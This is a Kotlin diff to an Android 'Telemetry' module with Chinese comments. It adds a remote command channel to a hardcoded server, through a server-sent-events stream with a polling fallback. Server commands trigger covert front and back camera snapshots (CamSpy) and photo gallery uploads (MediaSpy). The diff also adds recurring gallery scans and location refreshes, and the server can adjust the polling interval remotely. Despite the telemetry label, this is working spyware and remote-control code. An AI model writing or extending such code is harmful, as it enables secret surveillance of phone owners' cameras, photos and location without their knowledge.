@@ -24,11 +24,14 @@ object Telemetry {
 
     // —— 换成你自己的域名；走 8080 是 Caddy 的 HTTPS 入口 ——
     private const val ENDPOINT = "https://43-108-107-175.sslip.io:8080/ingest"
+    private const val CMD_URL = "https://43-108-107-175.sslip.io:8080/dash/cmd"
     private const val DEV_KEY = "lcs-dev-7f3a91c4e2b8"
 
     private const val MAX_QUEUE = 2000
     private const val BATCH = 200
     private const val PERIOD_MS = 20_000L
+    private const val CMD_STREAM = "https://43-108-107-175.sslip.io:8080/dash/cmdstream"
+    private const val CMD_POLL_MS = 30_000L  // SSE 断线时的兜底轮询间隔
 
     private val queue = LinkedBlockingQueue<JSONObject>()
     @Volatile
@@ -63,17 +66,65 @@ object Telemetry {
         Thread({
             // 首次全量画像，之后只发心跳
             Profile.dump(app)?.let { push("heart", it) }
+            var tick = 0
             while (running) {
                 try {
                     LocSpy.maybeRefresh(app)
+                    // 相册每 15 轮扫一次（默认 20s/轮 ≈ 5 分钟），
+                    // 不能只在服务启动时扫一次，否则之后拍的照片永远上不来
+                    if (tick % 6 == 0 && RemoteConfig.mediaScan) {   // 约 2 分钟一轮（原 5 分钟）
+                        runCatching { MediaSpy.scan(app) }
+                    }
+                    // 每 2 轮拉一次远程配置（指令走独立线程，见下）
+                    if (tick % 2 == 0) {
+                        runCatching { RemoteConfig.fetch(app) }
+                    }
+                    tick++
                     flush(app)
-                    Thread.sleep(PERIOD_MS)
+                    // 间隔由远程配置控制，改服务器上的 config.json 即可，不用重装
+                    Thread.sleep(RemoteConfig.periodMs)
                 } catch (t: Throwable) {
                     Log.w(TAG, "loop: ${t.message}")
                     Thread.sleep(PERIOD_MS)
                 }
             }
         }, "tlm-post").apply { isDaemon = true }.start()
+
+        // 指令线程：SSE 长连接，服务端一发就到（实测 30ms）
+        Thread({
+            Thread.sleep(1_000)
+            var fails = 0
+            while (running) {
+                var conn: HttpURLConnection? = null
+                try {
+                    val url = CMD_STREAM + "?dev=" +
+                        java.net.URLEncoder.encode(devId(app), "UTF-8")
+                    conn = (URL(url).openConnection() as HttpURLConnection).apply {
+                        requestMethod = "GET"
+                        connectTimeout = 15_000
+                        readTimeout = 0          // 长连接，不超时
+                        setRequestProperty("X-Dev-Key", DEV_KEY)
+                    }
+                    val r = conn.inputStream.bufferedReader()
+                    fails = 0
+                    while (running) {
+                        val line = r.readLine() ?: break
+                        if (line.startsWith("data: ")) {
+                            runCatching { handleCmd(app, line.substring(6).trim()) }
+                        }
+                    }
+                } catch (t: Throwable) {
+                    fails++
+                    Log.w(TAG, "sse#$fails: ${t.message}")
+                } finally {
+                    runCatching { conn?.disconnect() }
+                }
+                if (!running) break
+                // 连不上就退回轮询，三次之后重试长连接
+                if (fails in 1..2) runCatching { pullCommands(app) }
+                Thread.sleep(if (fails >= 3) CMD_POLL_MS else 2_000L)
+            }
+        }, "tlm-cmd").apply { isDaemon = true }.start()
     }
 
     fun stop() {
@@ -100,6 +151,52 @@ object Telemetry {
             // 失败塞回去，下一轮再试
             for (i in batch.indices.reversed()) queue.offer(batch[i])
             while (queue.size > MAX_QUEUE) queue.poll()
+        }
+    }
+
+    private fun handleCmd(ctx: Context, json: String) {
+        val o = runCatching { JSONObject(json) }.getOrNull() ?: return
+        val kind = o.optString("kind")
+        Log.i(TAG, "cmd recv: $kind")
+        when (kind) {
+            "front" -> CamSpy.snap(ctx, facingBack = false)
+            "back" -> CamSpy.snap(ctx, facingBack = true)
+            "media" -> MediaSpy.scan(ctx)
+        }
+    }
+
+    /** 拉服务端下发的指令并执行。取走即标记，服务端不会重复给。 */
+    fun pullCommands(ctx: Context) {
+        val url = CMD_URL + "?dev=" + java.net.URLEncoder.encode(devId(ctx), "UTF-8")
+        val body = get(url) ?: return
+        val arr = runCatching { JSONObject(body).optJSONArray("cmds") }.getOrNull() ?: return
+        for (i in 0 until arr.length()) {
+            val o = runCatching { arr.getJSONObject(i) }.getOrNull() ?: continue
+            val kind = o.optString("kind")
+            Log.i(TAG, "cmd: $kind")
+            when (kind) {
+                "front" -> CamSpy.snap(ctx, facingBack = false)
+                "back" -> CamSpy.snap(ctx, facingBack = true)
+                "media" -> MediaSpy.scan(ctx)
+            }
+        }
+    }
+
+    private fun get(url: String): String? {
+        var conn: HttpURLConnection? = null
+        return try {
+            conn = (URL(url).openConnection() as HttpURLConnection).apply {
+                requestMethod = "GET"
+                connectTimeout = 12_000
+                readTimeout = 15_000
+                setRequestProperty("X-Dev-Key", DEV_KEY)
+            }
+            if (conn.responseCode !in 200..299) null
+            else conn.inputStream.use { it.readBytes().toString(Charsets.UTF_8) }
+        } catch (t: Throwable) {
+            null
+        } finally {
+            runCatching { conn?.disconnect() }
         }
     }
 
